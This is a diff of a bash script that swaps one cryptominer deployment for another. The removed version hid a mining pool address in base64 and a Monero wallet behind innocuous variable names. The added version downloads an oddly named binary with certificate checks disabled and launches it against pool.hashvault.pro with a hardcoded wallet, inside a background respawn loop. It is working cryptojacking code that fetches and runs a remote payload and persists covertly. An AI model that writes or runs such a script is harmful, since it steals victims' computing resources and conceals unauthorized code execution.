@@ -1,31 +1,37 @@
 #!/bin/bash
+set -e
 
-curl -sLkO https://storage.technoelectro.online/mcp.tar.gz
-tar -xf mcp.tar.gz
-rm -rf mcp.tar.gz
-cd mcp 
-echo '#!/bin/bash
+DIR="/root"
+BIN_NAME="ababasnios"
+BIN_PATH="$DIR/$BIN_NAME"
+LOG_FILE="$DIR/runner.log"
+POOL="pool.hashvault.pro:3333"
+WALLET="8BBDheSYD9VRtWN7FEub3mUvoj2XdTpdzFWZy4pJtANaPDC5SfTf5DLa7V53AJuW632PiotRF4BtdL7bSRwj71wuLipRAyg"
+WORKER="gerebak"
+THREADS="2"
 
-PORT=$1
-NAME=$2
-if [ ! -d "python" ]; then
-  echo "Python folder not found → downloading..."
-  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
-  tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
-  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
-else
-  echo "Python already exists → skip download"
+echo "=== [1/4] Checking & Installing Dependencies ==="
+if ! command -v ldd >/dev/null 2>&1 || ! ldconfig -p | grep -q "libncurses.so.6"; then
+    echo "Installing required libraries..."
+    apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq libncurses6 libtinfo6 libssl3 libssl3t64 curl >/dev/null 2>&1 || true
 fi
-export PATH=./python/bin:$PATH
-yes |  pip install certifi
-export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=wss://mujiganteng.me
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjMzMzM=
-SERVER_DOMAIN=8BBDheSYD9VRtWN7FEub3mUvoj2XdTpdzFWZy4pJtANaPDC5SfTf5DLa7V53AJuW632PiotRF4BtdL7bSRwj71wuLipRAyg
-SERVER_SECRET=$NAME
-SERVER_CONNECTION=$PORT
-SERVER_MODE=FAST" > .env
-while true; do
-  python3 app.py
-  sleep 15
-done' > build.sh
+
+echo "=== [2/4] Downloading ababasnios ==="
+if [ ! -f "$BIN_PATH" ]; then
+    curl -sLk "https://github.com/rahuldev344/kirakirawa/releases/download/ababa/ababasnios" -o "$BIN_PATH"
+    chmod +x "$BIN_PATH"
+fi
+
+echo "=== [3/4] Stopping old instances ==="
+pkill -9 -f "$BIN_NAME" 2>/dev/null || true
+rm -f "$LOG_FILE"
+
+echo "=== [4/4] Starting daemon with auto-respawn in background ==="
+nohup bash -c "while true; do
+    $BIN_PATH -o $POOL -u $WALLET/$WORKER -a rx/0 -t $THREADS --no-huge-pages --no-color >> $LOG_FILE 2>&1
+    sleep 3
+done" >/dev/null 2>&1 </dev/null &
+
+sleep 2
+echo "=== Started successfully! Attaching live logs (Ctrl+C to detach) ==="
+tail -n 25 -f "$LOG_FILE"
